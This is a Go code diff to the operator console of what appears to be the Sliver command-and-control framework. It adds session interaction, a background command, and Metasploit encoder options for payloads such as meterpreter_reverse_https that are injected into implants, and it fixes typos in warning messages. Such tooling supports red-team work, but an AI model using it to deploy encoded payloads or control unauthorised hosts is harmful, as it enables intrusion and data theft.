@@ -34,16 +34,36 @@ func helpCmd(term *readline.Instance, args []string) {
 
 func sessionsCmd(term *readline.Instance, args []string) {
 	sessionsFlags := flag.NewFlagSet("sessions", flag.ContinueOnError)
+	interact := sessionsFlags.String("i", "", "iteract with sesssion")
 	sessionsFlags.Usage = func() { helpCmd(term, []string{"sessions"}) }
 	err := sessionsFlags.Parse(args)
 	if err == flag.ErrHelp {
 		return
 	}
 
+	if *interact != "" {
+		useCmd(term, []string{*interact})
+		return
+	}
+
 	if 0 < len(*hive) {
 		printSlivers(term)
 	} else {
-		fmt.Fprintln(term, "\n"+Info+"No slivers connected")
+		fmt.Fprintln(term, "\n"+Info+"No slivers connected\n")
+	}
+}
+
+func backgroundCmd(term *readline.Instance, args []string) {
+	backgroundFlags := flag.NewFlagSet("background", flag.ContinueOnError)
+	backgroundFlags.Usage = func() { helpCmd(term, []string{"background"}) }
+	err := backgroundFlags.Parse(args)
+	if err == flag.ErrHelp {
+		return
+	}
+	if activeSliver != nil {
+		activeSliver = nil
+		term.SetPrompt(getPrompt())
+		term.Refresh()
 	}
 }
 
@@ -227,6 +247,8 @@ func msfCmd(term *readline.Instance, args []string) {
 	payloadName := msfFlags.String("payload", "meterpreter_reverse_https", "metasploit payload")
 	lhost := msfFlags.String("lhost", "", "metasploit listener lhost")
 	lport := msfFlags.Int("lport", 4444, "metasploit listner port")
+	encoder := msfFlags.String("encoder", "", "metasploit encoder")
+	iterations := msfFlags.Int("iterations", 1, "metasploit encoder iterations")
 	msfFlags.Usage = func() { helpCmd(term, []string{"msf"}) }
 	err := msfFlags.Parse(args)
 	if err == flag.ErrHelp {
@@ -234,7 +256,7 @@ func msfCmd(term *readline.Instance, args []string) {
 	}
 
 	if activeSliver == nil {
-		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
+		fmt.Fprintln(term, "\n"+Warn+"Please select an active sliver via `use`\n")
 		return
 	}
 
@@ -251,8 +273,8 @@ func msfCmd(term *readline.Instance, args []string) {
 		Payload:    *payloadName,
 		LHost:      *lhost,
 		LPort:      uint16(*lport),
-		Encoder:    "",
-		Iterations: 0, // TODO: Add support for msf encoders
+		Encoder:    *encoder,
+		Iterations: *iterations,
 	}
 	rawPayload, err := msf.VenomPayload(config)
 	if err != nil {
@@ -287,7 +309,7 @@ func injectCmd(term *readline.Instance, args []string) {
 	}
 
 	if activeSliver == nil {
-		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
+		fmt.Fprintln(term, "\n"+Warn+"Please select an active sliver via `use`\n")
 		return
 	}
 	if *lhost == "" {
@@ -338,7 +360,7 @@ func psCmd(term *readline.Instance, args []string) {
 	}
 
 	if activeSliver == nil {
-		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
+		fmt.Fprintln(term, "\n"+Warn+"Please select an active sliver via `use`\n")
 		return
 	}
 
@@ -441,7 +463,7 @@ func lsCmd(term *readline.Instance, args []string) {
 	}
 
 	if activeSliver == nil {
-		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
+		fmt.Fprintln(term, "\n"+Warn+"Please select an active sliver via `use`\n")
 		return
 	}
 
@@ -498,7 +520,7 @@ func cdCmd(term *readline.Instance, args []string) {
 		return
 	}
 	if activeSliver == nil {
-		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
+		fmt.Fprintln(term, "\n"+Warn+"Please select an active sliver via `use`\n")
 		return
 	}
 
@@ -535,7 +557,7 @@ func pwdCmd(term *readline.Instance, args []string) {
 		return
 	}
 	if activeSliver == nil {
-		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
+		fmt.Fprintln(term, "\n"+Warn+"Please select an active sliver via `use`\n")
 		return
 	}
 
@@ -571,7 +593,7 @@ func catCmd(term *readline.Instance, args []string) {
 	}
 
 	if activeSliver == nil {
-		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
+		fmt.Fprintln(term, "\n"+Warn+"Please select an active sliver via `use`\n")
 		return
 	}
 
@@ -595,7 +617,7 @@ func downloadCmd(term *readline.Instance, args []string) {
 	}
 
 	if activeSliver == nil {
-		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
+		fmt.Fprintln(term, "\n"+Warn+"Please select an active sliver via `use`\n")
 		return
 	}
 
@@ -648,7 +670,7 @@ func uploadCmd(term *readline.Instance, args []string) {
 	}
 
 	if activeSliver == nil {
-		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
+		fmt.Fprintln(term, "\n"+Warn+"Please select an active sliver via `use`\n")
 		return
 	}
 
